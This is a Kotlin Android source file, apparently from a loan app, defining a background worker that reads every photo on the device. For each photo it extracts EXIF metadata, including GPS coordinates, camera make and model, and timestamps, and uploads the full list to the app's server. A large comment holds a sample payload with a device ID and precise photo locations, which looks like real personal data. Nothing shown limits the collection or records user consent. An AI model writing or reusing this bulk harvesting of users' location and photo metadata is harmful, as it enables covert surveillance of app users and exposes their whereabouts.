package com.loanspeed.speed.util.workManager

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.media.ExifInterface
import android.net.Uri
import android.provider.MediaStore
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import com.loanspeed.speed.ext.createBody
import com.loanspeed.speed.ext.cvtLocTag
import com.loanspeed.speed.ext.getFileName
import com.loanspeed.speed.model.Album
import com.loanspeed.speed.net.ApiServices
import com.loanspeed.speed.util.ContactUtil.formateTime
import com.loanspeed.speed.util.slog
import com.loanspeed.speed.net.HttpManager
import java.io.File
import java.text.SimpleDateFormat


/**
 * 手机照片上传
 */
class PhotoWM(private val context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {

    private val goon = Gson()
    private val mApiService by lazy { HttpManager.create(ApiServices::class.java) }


    override suspend fun doWork(): Result {
        try {
            val photoList = getSystemPhotoList(context)
            val albums = mutableListOf<Album>()
            photoList?.let {
                val dataMap = HashMap<String, Any>()
                it.slog("图片地址")
                for (path in photoList) {


//                    {"other_info":"","pck_name":"com.loanspeed.speed","device_id":"6bef8d89f4b84e9ab663da5e777f062f","sub_place_code":"","album":"[{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:12 11:31:59\",\"height\":\"4160\",\"latitude_g\":\"22.539352416666667\",\"longitude_g\":\"113.94886777777778\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221012_11315451\",\"width\":\"3120\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:20 14:56:31\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221020_145631\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:20 14:56:40\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221020_145640\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:20 14:56:49\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221020_145649\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:21 14:46:11\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221021_144611\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:25 10:50:13\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221025_105013\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:09:44\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_110944\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:10:31\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111031\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:10:46\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111046\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:11:37\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111137\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:11:52\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111152\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:13:18\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111318\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:13:51\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111351\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:14:17\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111417\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:14:50\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111450\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:16:25\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_111625\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:20:05\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_112005\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",
//                        \"date\":\"2022:10:28 11:20:13\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_112013\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:31\",\"date\":\"2022:10:28 11:20:56\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_112056\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:10:28 11:22:21\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_112221\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:10:28 11:23:08\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221028_112308\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:10:28 14:42:14\",\"height\":\"3120\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221028_14420341\",\"width\":\"4160\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:10:28 14:42:38\",\"height\":\"3120\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221028_14422940\",\"width\":\"4160\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:10:31 15:56:03\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221031_155603\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:02 16:14:51\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221102_161451\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:02 16:15:57\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221102_161557\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:02 16:18:42\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221102_161842\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:02 16:18:58\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221102_161858\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:02 16:19:03\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221102_161903\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:14 15:07:18\",\"height\":\"4160\",\"latitude_g\":\"22.538663861111115\",\"longitude_g\":\"113.94865416666667\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221114_15071381\",\"width\":\"3120\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:14 15:20:42\",\"height\":\"4160\",\"latitude_g\":\"22.538663861111115\",\"longitude_g\":\"113.94867705555556\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221114_15203872\",\"width\":\"3120\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:15 15:02:32\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221115_150232\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:15 15:41:18\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221115_154118\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:15 17:03:48\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221115_170348\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:15 17:06:15\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\
//                        ":\"\",\"model\":\"\",\"name\":\"Screenshot_20221115_170615\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:16 16:33:33\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221116_163333\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:16 16:38:24\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221116_163824\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:18 16:08:54\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221118_160854\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:18 17:11:18\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221118_171118\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:18 17:12:40\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221118_171240\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:18 17:33:04\",\"height\":\"2560\",\"latitude_g\":\"22.53848263888889\",\"longitude_g\":\"113.94839475\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221118_17325509\",\"width\":\"1920\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:23 15:25:53\",\"height\":\"2560\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221123_15254723\",\"width\":\"1920\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:23 16:45:53\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221123_164553\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:23 16:47:25\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221123_164725\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:23 16:48:01\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221123_164801\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:24 15:37:44\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221124_153744\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 10:07:50\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_100750\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 10:07:55\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_100755\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 10:08:00\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_100800\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 10:08:05\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_100805\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 10:08:13\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_100813\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 16:44:28\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_164428\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 16:45:03\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_164503\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:11:25 17:01:17\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221125_170117\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:05 18:54:11\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221205_185411\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:08 15:14:11\",\"height\":\"4160\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20221208_15135603\",\"width\":\"3120\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:16 10:21:58\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221216_102158\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:16 10:22:05\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221216_102205\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:16 10:22:11\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221216_102211\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:16 10:22:49\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221216_102249\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:26 14:28:09\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221226_142809\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:26 14:37:23\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221226_143723\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:27 10:24:16\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221227_102416\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:27 10:24:22\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221227_102422\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2022:12:27 10:24:34\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20221227_102434\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:05 18:08:26\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230105_180826\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:05 18:08:36\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230105_180836\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:09 10:35:42\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230109_103542\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:09 10:35:56\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230109_103556\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:13 10:44:21\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230113_104421\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:0
//                        1:13 10:45:03\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230113_104503\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:01:13 10:45:34\",\"height\":\"1520\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"\",\"model\":\"\",\"name\":\"Screenshot_20230113_104534\",\"width\":\"720\"},{\"create_time\":\"2023-02-01 15:35:32\",\"date\":\"2023:02:01 15:00:13\",\"height\":\"4160\",\"latitude_g\":\"\",\"longitude_g\":\"\",\"make\":\"vivo\",\"model\":\"vivo 1820\",\"name\":\"IMG_20230201_150012\",\"width\":\"3120\"}]","place":"google","phone_brand":"vivo","invitationCode":"","phone_model":"vivo 1820"}


                    val exifInterface: ExifInterface = ExifInterface(path)



                    val name = path.getFileName() ?: ""
                    val dateTime = exifInterface.getAttribute(ExifInterface.TAG_DATETIME) ?: ""
                    var latitudeRef: String =
                        exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF) ?: ""
                    var longitudeRef: String =
                        exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF) ?: ""


                    var latitude: String =
                        exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE) ?: ""
                    var longitude: String =
                        exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE) ?: ""
                    latitudeRef.slog(" ")
                    longitudeRef.slog(" ")
                    latitude.slog(" ")
                    longitude.slog(" ")



                    if (latitude.isNotEmpty() && longitude.isNotEmpty()) {
                        latitude = cvtLocTag(latitude, latitudeRef).toString()
                        longitude = cvtLocTag(longitude, longitudeRef).toString()
                    }

                    val imageLength =
                        exifInterface.getAttribute(ExifInterface.TAG_IMAGE_LENGTH) ?: ""
                    val imageWidth = exifInterface.getAttribute(ExifInterface.TAG_IMAGE_WIDTH) ?: ""
                    val make = exifInterface.getAttribute(ExifInterface.TAG_MAKE) ?: ""
                    val model = exifInterface.getAttribute(ExifInterface.TAG_MODEL) ?: ""
                    albums.add(
                        Album(
                            formateTime(System.currentTimeMillis()),
                            dateTime,
                            imageLength,
                            latitude,
                            longitude,
                            make,
                            model,
                            name,
                            imageWidth
                        )
                    )
                }
                dataMap["album"] = goon.toJson(albums)
                mApiService.uploadAlbum(dataMap.createBody())
            }
            return Result.success()
        } catch (e: Exception) {

            return Result.failure()
        }

    }

    fun getSystemPhotoList(context: Context): List<String>? {
        val result: MutableList<String> = ArrayList()
        val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val contentResolver: ContentResolver = context.contentResolver
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
        if (cursor == null || cursor.getCount() <= 0) return null // 没有图片
        while (cursor.moveToNext()) {
            val index: Int = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val path: String = cursor.getString(index) // 文件地址
            val file = File(path)
            if (file.exists()) {
                result.add(path)

            }
        }
        return result
    }


}